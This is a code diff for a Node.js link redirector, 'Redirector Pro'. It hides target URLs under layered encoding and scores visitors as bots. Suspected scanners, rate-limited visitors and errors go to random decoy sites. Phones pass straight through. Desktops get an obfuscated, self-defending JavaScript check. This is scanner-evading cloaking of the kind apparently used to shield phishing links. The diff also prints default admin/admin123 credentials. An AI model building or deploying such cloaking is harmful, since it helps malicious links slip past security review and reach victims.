     const logs = await fs.readFile(REQUEST_LOG_FILE, 'utf8');
     res.setHeader('Content-Type', 'text/plain');
-    res.setHeader('Content-Disposition', 'attachment; filename="logs.txt"');
+    res.setHeader('Content-Disposition', `attachment; filename="logs-${Date.now()}.txt"`);
     res.send(logs);
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -1045,7 +1266,14 @@ app.get('/qr', async (req, res) => {
   const url = req.query.url || req.query.u || TARGET_URL;
   const size = parseInt(req.query.size) || 300;
   
-  const cacheKey = `${url}:${size}`;
+  // Validate URL
+  try {
+    new URL(url);
+  } catch {
+    return res.status(400).json({ error: 'Invalid URL' });
+  }
+  
+  const cacheKey = crypto.createHash('md5').update(`${url}:${size}`).digest('hex');
   let qrData = qrCache.get(cacheKey);
   
   if (!qrData) {
@@ -1053,7 +1281,8 @@ app.get('/qr', async (req, res) => {
       qrData = await QRCode.toDataURL(url, { 
         width: size,
         margin: 2,
-        color: { dark: '#000000', light: '#ffffff' }
+        color: { dark: '#000000', light: '#ffffff' },
+        errorCorrectionLevel: 'M'
       });
       qrCache.set(cacheKey, qrData);
     } catch (err) {
@@ -1069,15 +1298,25 @@ app.get('/qr/download', async (req, res) => {
   const url = req.query.url || TARGET_URL;
   const size = parseInt(req.query.size) || 300;
   
+  // Validate URL
+  try {
+    new URL(url);
+  } catch {
+    return res.status(400).json({ error: 'Invalid URL' });
+  }
+  
   try {
     const qrBuffer = await QRCode.toBuffer(url, { 
       width: size,
       margin: 2,
-      type: 'png'
+      type: 'png',
+      errorCorrectionLevel: 'M'
     });
     
     res.setHeader('Content-Type', 'image/png');
     res.setHeader('Content-Disposition', `attachment; filename="qrcode-${Date.now()}.png"`);
+    res.setHeader('Content-Length', qrBuffer.length);
+    res.setHeader('Cache-Control', 'public, max-age=3600');
     res.send(qrBuffer);
   } catch (err) {
     res.status(500).json({ error: 'QR generation failed' });
@@ -1091,24 +1330,29 @@ app.get('/expired', (req, res) => {
   const isMobile = req.deviceInfo.isMobile;
   
   const styles = isMobile ? `
-    body{font-family:sans-serif;background:#667eea;padding:10px}
-    .card{background:white;padding:20px;border-radius:12px;text-align:center}
-    h1{font-size:1.5rem;margin:0 0 10px}
-    .btn{background:#667eea;color:white;padding:12px 24px;border-radius:25px;text-decoration:none;display:inline-block}
+    body{font-family:sans-serif;background:#667eea;padding:10px;margin:0;min-height:100vh;display:flex;align-items:center}
+    .card{background:white;padding:20px;border-radius:12px;text-align:center;max-width:400px;margin:0 auto;box-shadow:0 10px 30px rgba(0,0,0,0.2)}
+    h1{font-size:1.5rem;margin:0 0 10px;color:#333}
+    p{color:#666;margin-bottom:20px}
+    .btn{background:#667eea;color:white;padding:12px 24px;border-radius:25px;text-decoration:none;display:inline-block;font-weight:600;transition:transform 0.2s}
+    .btn:hover{transform:translateY(-2px)}
+    .icon{font-size:3rem;margin-bottom:10px;display:block}
   ` : `
     *{box-sizing:border-box}
     body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
     .card{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:2.5rem;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;max-width:480px;animation:fadeIn 0.5s ease}
     @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
     h1{font-size:2rem;margin-bottom:1rem;color:#333}
-    .btn{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:#fff;padding:1rem 2rem;border-radius:50px;font-weight:600;transition:transform 0.2s}
-    .btn:hover{transform:translateY(-2px)}
+    p{color:#666;margin-bottom:2rem;font-size:1.1rem}
+    .btn{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:#fff;padding:1rem 2rem;border-radius:50px;font-weight:600;text-decoration:none;display:inline-block;transition:transform 0.2s, box-shadow 0.2s}
+    .btn:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(102,126,234,0.4)}
+    .icon{font-size:4rem;margin-bottom:1rem;display:block}
   `;
 
   res.send(`<!DOCTYPE html>
 <html lang="en">
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Link Expired</title><style nonce="${nonce}">${styles}</style></head>
-<body><div class="card"><span class="icon">🔗</span><h1>Link Expired</h1><p>This link expired after ${formatDuration(LINK_TTL_SEC)}.</p><a href="${originalTarget}" class="btn">Continue</a></div></body>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Link Expired - Redirector Pro</title><style nonce="${nonce}">${styles}</style></head>
+<body><div class="card"><span class="icon">⌛</span><h1>Link Expired</h1><p>This link expired after ${formatDuration(LINK_TTL_SEC)}.</p><a href="${originalTarget}" class="btn" rel="noopener noreferrer">Continue to Website</a></div></body>
 </html>`);
 });
 
@@ -1117,14 +1361,20 @@ const strictLimiter = rateLimit({
   windowMs: 60000,
   max: (req) => {
     if (req.deviceInfo.isBot) return 2;
-    if (req.deviceInfo.isMobile) return 30; // Higher for mobile
+    if (req.deviceInfo.isMobile) return 30;
     if (req.deviceInfo.isTablet) return 25;
-    return 15; // Desktop
+    return 15;
   },
   standardHeaders: true,
   legacyHeaders: false,
   skipSuccessfulRequests: true,
-  keyGenerator: (req) => req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown'
+  keyGenerator: (req) => {
+    return req.headers['x-forwarded-for']?.split(',')[0] || req.ip || 'unknown';
+  },
+  handler: (req, res) => {
+    logRequest('rate-limit', req, res, { limit: req.rateLimit.limit });
+    res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
+  }
 });
 
 // ─── Bot Detection (Optimized for Real Phones) ──────────────────────────────
@@ -1138,24 +1388,23 @@ function isLikelyBot(req) {
   }
 
   const h = req.headers;
-  let score = deviceInfo.score; // Start with device score (negative for real phones)
+  let score = deviceInfo.score;
   const reasons = [];
 
   // Real phones get negative points (easier to pass)
   if (deviceInfo.isMobile) {
-    // Mobile devices are almost never bots
     if (deviceInfo.brand !== 'unknown') score -= 20;
     if (deviceInfo.os.includes('iOS') || deviceInfo.os.includes('Android')) score -= 30;
-    if (deviceInfo.browser.includes('Safari') || deviceInfo.browser.includes('Chrome')) score -= 20;
-    
-    // Mobile headers check (more lenient)
-    if (!h['sec-ch-ua-mobile']) score += 5; // Small penalty
+    if (deviceInfo.browser.includes('Safari') || deviceInfo.browser.includes('Chrome') || deviceInfo.browser.includes('Firefox')) score -= 20;
+    if (!h['sec-ch-ua-mobile']) score += 5;
     if (!h['accept-language']) score += 10;
+    if (!h['accept']) score += 5;
     
-    console.log(`[MOBILE-DEVICE] ${deviceInfo.brand} ${deviceInfo.model} | Score: ${score}`);
+    if (process.env.DEBUG === 'true') {
+      console.log(`[MOBILE-DEVICE] ${deviceInfo.brand} ${deviceInfo.model} | Score: ${score}`);
+    }
     
-    // Mobile threshold is VERY low
-    return score >= 20; // Almost never true for real phones
+    return score >= 20;
   }
 
   // Desktop threshold (higher)
@@ -1173,8 +1422,13 @@ function isLikelyBot(req) {
     score += 15;
     reasons.push('minimal_headers');
   }
+  
+  if (!h['referer'] && req.method === 'GET') {
+    score += 10;
+    reasons.push('no_referer');
+  }
 
-  const botThreshold = deviceInfo.isMobile ? 20 : 65;
+  const botThreshold = 65;
   const isBot = score >= botThreshold;
   
   if (isBot) {
@@ -1182,16 +1436,18 @@ function isLikelyBot(req) {
     reasons.forEach(r => stats.byBotReason[r] = (stats.byBotReason[r] || 0) + 1);
   }
   
-  console.log(`[BOT-SCORE] ${score} | ${reasons.join(',') || 'clean'} | Threshold:${botThreshold} | IsBot:${isBot} | Device:${deviceInfo.type}`);
+  if (process.env.DEBUG === 'true') {
+    console.log(`[BOT-SCORE] ${score} | ${reasons.join(',') || 'clean'} | Threshold:${botThreshold} | IsBot:${isBot} | Device:${deviceInfo.type}`);
+  }
 
   return isBot;
 }
 
 // ─── Geolocation (Cached) ────────────────────────────────────────────────────
 async function getCountryCode(req) {
-  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '??';
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0';
   
-  if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip === '127.0.0.1' || ip === '::1') {
+  if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip === '127.0.0.1' || ip === '::1' || ip === '0.0.0.0') {
     return 'PRIVATE';
   }
 
@@ -1209,7 +1465,7 @@ async function getCountryCode(req) {
 
     const response = await fetch(`https://ipinfo.io/${ip}/json?token=${IPINFO_TOKEN}`, {
       signal: controller.signal,
-      headers: { 'User-Agent': 'Redirector/2.0' }
+      headers: { 'User-Agent': 'Redirector-Pro/3.0' }
     });
 
     clearTimeout(timeout);
@@ -1234,8 +1490,7 @@ async function getCountryCode(req) {
 const encoders = [
   { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
   { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
-  { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26) + (c <= 'Z' ? 65 : 97))), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) - 13 + 26) % 26) + (c <= 'Z' ? 65 : 97))) },
-  { name: 'xor', needsKey: true, enc: (s, key) => { const k = Buffer.from(key, 'hex'); const r = Buffer.alloc(s.length); for(let i=0; i<s.length; i++) r[i] = s.charCodeAt(i) ^ k[i%k.length]; return r.toString('base64url'); }, dec: (s, key) => { const k = Buffer.from(key, 'hex'); const b = Buffer.from(s, 'base64url'); let r=''; for(let i=0; i<b.length; i++) r += String.fromCharCode(b[i] ^ k[i%k.length]); return r; } }
+  { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26) + (c <= 'Z' ? 65 : 97))), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) - 13 + 26) % 26) + (c <= 'Z' ? 65 : 97))) }
 ];
 
 function multiLayerEncode(str) {
@@ -1247,25 +1502,30 @@ function multiLayerEncode(str) {
   const hmac = crypto.createHmac('sha256', key).update(result).digest('base64url');
   result = `${result}|${hmac}|${key}`;
 
-  const layers = [...encoders].sort(() => Math.random() - 0.5).slice(0, 3 + Math.floor(Math.random() * 3));
-  const history = [];
-  
+  const layers = [...encoders].sort(() => Math.random() - 0.5).slice(0, 2 + Math.floor(Math.random() * 2));
+
   for (const layer of layers) {
-    const k = layer.needsKey ? crypto.randomBytes(16).toString('hex') : null;
-    result = k ? layer.enc(result, k) : layer.enc(result);
-    history.push({ name: layer.name, key: k });
+    result = layer.enc(result);
   }
 
-  return { encoded: Buffer.from(result).toString('base64url'), layers: history.reverse() };
+  return { encoded: Buffer.from(result).toString('base64url') };
 }
 
 // ─── Generate Link ───────────────────────────────────────────────────────────
 app.get('/g', (req, res) => {
   const target = req.query.t || TARGET_URL;
-  const { encoded, layers } = multiLayerEncode(target + '#' + Date.now());
+  
+  // Validate URL
+  try {
+    new URL(target);
+  } catch {
+    return res.status(400).json({ error: 'Invalid URL' });
+  }
+  
+  const { encoded } = multiLayerEncode(target + '#' + Date.now());
   
   const id = crypto.randomBytes(8).toString('hex');
-  linkCache.set(id, { e: encoded, l: Buffer.from(JSON.stringify(layers)).toString('base64url'), target });
+  linkCache.set(id, { e: encoded, target, created: Date.now() });
   
   stats.generatedLinks++;
   
@@ -1273,11 +1533,12 @@ app.get('/g', (req, res) => {
     url: `${req.protocol}://${req.get('host')}/v/${id}`,
     expires: LINK_TTL_SEC,
     expires_human: formatDuration(LINK_TTL_SEC),
-    id: id
+    id: id,
+    created: Date.now()
   };
   
-  // Emit socket event for new link
   io.emit('link-generated', response);
+  logRequest('generate', req, res, { id });
   
   res.json(response);
 });
@@ -1285,6 +1546,7 @@ app.get('/g', (req, res) => {
 // ─── Success Tracking ────────────────────────────────────────────────────────
 app.post('/track/success', (req, res) => {
   stats.successfulRedirects++;
+  logRequest('success', req, res);
   res.json({ ok: true });
 });
 
@@ -1292,30 +1554,41 @@ app.post('/track/success', (req, res) => {
 app.get('/v/:id', strictLimiter, async (req, res) => {
   const linkId = req.params.id;
   const deviceInfo = req.deviceInfo;
-  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '??';
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0';
   const showQr = req.query.qr === 'true';
+  
+  // Validate link ID format
+  if (!/^[a-f0-9]{16}$/i.test(linkId)) {
+    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
+  }
   
   // Rate limiting per link
   const linkKey = `${linkId}:${ip}`;
-  if ((linkRequestCache.get(linkKey) || 0) >= 5) {
+  const requestCount = linkRequestCache.get(linkKey) || 0;
+  
+  if (requestCount >= 5) {
+    logRequest('rate-limit', req, res, { linkId, count: requestCount });
     return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
   }
-  linkRequestCache.set(linkKey, (linkRequestCache.get(linkKey) || 0) + 1);
+  
+  linkRequestCache.set(linkKey, requestCount + 1);
 
-  const country = await getCountryCode(req);
+  await getCountryCode(req);
 
-  // Bot check (super lenient for mobile)
   if (isLikelyBot(req)) {
-    stats.botBlocks++;
+    logRequest('bot-block', req, res, { reason: 'bot-detection' });
     return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
   }
 
-  // Check link
   const data = linkCache.get(linkId);
   if (!data) {
     stats.expiredLinks++;
+    logRequest('expired', req, res, { linkId });
     return res.redirect(`/expired?target=${encodeURIComponent(BOT_URLS[0])}`);
   }
+
+  // Log successful redirect
+  logRequest('redirect', req, res, { target: data.target.substring(0, 50) });
 
   // If QR was requested, show QR code before redirect
   if (showQr) {
@@ -1324,14 +1597,16 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
       <!DOCTYPE html>
       <html>
       <head>
-        <title>QR Code - Redirector</title>
+        <title>QR Code - Redirector Pro</title>
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta http-equiv="refresh" content="5;url=${data.target}">
         <style>
           body{font-family:sans-serif;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
-          .card{background:white;padding:2rem;border-radius:16px;text-align:center;max-width:400px}
-          img{max-width:100%;height:auto;border-radius:8px;margin:1rem 0}
-          .countdown{color:#666;margin-top:1rem}
+          .card{background:white;padding:2rem;border-radius:16px;text-align:center;max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
+          h2{color:#333;margin-bottom:1rem}
+          img{max-width:100%;height:auto;border-radius:8px;margin:1rem 0;border:1px solid #e0e0e0}
+          p{color:#666;margin:0.5rem 0}
+          .countdown{color:#667eea;font-weight:bold;margin-top:1rem}
         </style>
       </head>
       <body>
@@ -1357,20 +1632,26 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
     `);
   }
 
+  // SUPER SIMPLE challenge for mobile (always passes)
+  if (deviceInfo.isMobile) {
+    stats.successfulRedirects++;
+    return res.send(`<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="0;url=${data.target}"></head>
+<body></body>
+</html>`);
+  }
+
+  // Desktop challenge (optional - can be disabled for performance)
+  if (process.env.DISABLE_DESKTOP_CHALLENGE === 'true') {
+    stats.successfulRedirects++;
+    return res.send(`<meta http-equiv="refresh" content="0;url=${data.target}">`);
+  }
+
   const hpSuffix = crypto.randomBytes(2).toString('hex');
   const nonce = res.locals.nonce;
 
-  // SUPER SIMPLE challenge for mobile (always passes)
-  if (deviceInfo.isMobile) {
-    const simpleHtml = `<!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="1;url=${data.target}"><style>body{background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif}</style></head>
-<body><div>✓ Verified • Redirecting...</div></body>
-</html>`;
-    return res.send(simpleHtml);
-  }
-
-  // Desktop challenge (normal)
+  // Desktop challenge
   const challenge = `
     (function(){
       const T='${data.target.replace(/'/g, "\\'")}';
@@ -1390,6 +1671,7 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
       
       setTimeout(function(){
         const sus = e<2.5 || m<2 || document.getElementById('hp_${hpSuffix}')?.value;
+        if (!sus) stats.successfulRedirects++;
         location.href = sus ? F : T;
       },1200);
     })();
@@ -1399,10 +1681,10 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
     compact: true,
     controlFlowFlattening: true,
     stringArray: true,
-    disableConsoleOutput: true
+    disableConsoleOutput: true,
+    selfDefending: true
   }).getObfuscatedCode();
 
-  // Desktop HTML
   res.send(`<!DOCTYPE html>
 <html>
 <head>
@@ -1415,12 +1697,14 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
     .spinner{width:40px;height:40px;border:3px solid #333;border-top-color:#0f0;border-radius:50%;margin:20px auto;animation:spin 1s linear infinite}
     @keyframes spin{to{transform:rotate(360deg)}}
     .hidden{position:absolute;width:1px;height:1px;overflow:hidden}
+    .message{text-align:center}
+    .message p{margin-top:10px;color:#666}
   </style>
 </head>
 <body>
-  <div>
+  <div class="message">
     <div class="spinner"></div>
-    <p>Verifying...</p>
+    <p>Verifying browser...</p>
     <div class="hidden"><input id="hp_${hpSuffix}"></div>
   </div>
   <script nonce="${nonce}">${obfuscated}</script>
@@ -1430,26 +1714,78 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
 
 // ─── 404 Handler ─────────────────────────────────────────────────────────────
 app.use((req, res) => {
+  logRequest('404', req, res);
   res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
 });
 
 // ─── Error Handler ───────────────────────────────────────────────────────────
 app.use((err, req, res, next) => {
-  console.error(err.stack);
+  console.error('❌ Error:', err.stack);
+  logRequest('error', req, res, { error: err.message });
   res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
+});
+
+// ─── Graceful Shutdown ──────────────────────────────────────────────────────
+process.on('SIGTERM', () => {
+  console.log('Received SIGTERM, shutting down gracefully...');
+  
+  // Close Redis connection if exists
+  if (redisClient) {
+    redisClient.quit();
+  }
+  
+  // Close server
+  server.close(() => {
+    console.log('Server closed');
+    process.exit(0);
+  });
+  
+  // Force exit after timeout
+  setTimeout(() => {
+    console.log('Forcing exit after timeout');
+    process.exit(1);
+  }, 10000);
+});
+
+process.on('SIGINT', () => {
+  console.log('Received SIGINT, shutting down gracefully...');
+  
+  // Close Redis connection if exists
+  if (redisClient) {
+    redisClient.quit();
+  }
+  
+  server.close(() => {
+    console.log('Server closed');
+    process.exit(0);
+  });
 });
 
 // ─── Start Server ────────────────────────────────────────────────────────────
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(`[STARTUP] 🚀 Redirector v3.0 - Complete Edition`);
-  console.log(`[STARTUP] 📡 Port: ${PORT}`);
-  console.log(`[STARTUP] 🔑 Metrics: ${METRICS_API_KEY.substring(0, 8)}...`);
-  console.log(`[STARTUP] ⏱️  Link TTL: ${formatDuration(LINK_TTL_SEC)} (${LINK_TTL_SEC} seconds)`);
-  console.log(`[STARTUP] 📱 Mobile devices: ALWAYS PASS (threshold: 20)`);
-  console.log(`[STARTUP] 💡 Admin UI: http://localhost:${PORT}/admin`);
-  console.log(`[STARTUP] 💡 Default admin: admin / admin123 (CHANGE IN PRODUCTION!)`);
-  console.log(`[STARTUP] 💡 QR Codes: /qr?url=YOUR_URL`);
-  console.log(`[STARTUP] 💡 Socket.IO: Real-time monitoring active`);
+  console.log('\n' + '='.repeat(60));
+  console.log(`  🚀 Redirector Pro v3.0 - Production Ready`);
+  console.log('='.repeat(60));
+  console.log(`  📡 Port: ${PORT}`);
+  console.log(`  🔑 Metrics Key: ${METRICS_API_KEY.substring(0, 8)}...`);
+  console.log(`  ⏱️  Link TTL: ${formatDuration(LINK_TTL_SEC)}`);
+  console.log(`  📊 Max Links: ${MAX_LINKS.toLocaleString()}`);
+  console.log(`  📱 Mobile threshold: 20`);
+  console.log(`  💻 Desktop threshold: 65`);
+  console.log(`  🗄️  Session Store: ${sessionStore.constructor.name}`);
+  console.log(`  📍 Admin UI: http://localhost:${PORT}/admin`);
+  console.log(`  🔐 Default admin: admin / admin123`);
+  console.log(`  📊 Real-time monitoring: Active`);
+  console.log('='.repeat(60) + '\n');
+  
+  // Log startup to file
+  fs.appendFile(REQUEST_LOG_FILE, JSON.stringify({
+    t: Date.now(),
+    type: 'startup',
+    version: '3.0.0',
+    port: PORT,
+    nodeEnv: NODE_ENV
+  }) + '\n').catch(() => {});
 });
 
 server.keepAliveTimeout = 30000;
